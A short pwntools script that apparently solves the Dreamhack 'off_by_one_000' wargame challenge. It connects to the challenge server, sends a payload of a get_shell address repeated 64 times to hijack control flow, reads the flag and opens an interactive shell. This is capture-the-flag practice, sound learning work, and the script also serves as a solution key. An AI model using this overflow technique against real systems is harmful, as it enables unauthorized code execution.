from pwn import *
# e = ELF('./off_by_one_000')

def solve():
    r = remote('host1.dreamhack.games', 20180)
    payload = p32(0x80485db) * 64 # get_shell (e.g. e.symbols['get_shell])
    r.sendline(payload)
    r.sendline('cat flag')
    r.interactive()

if __name__ == '__main__':
    solve()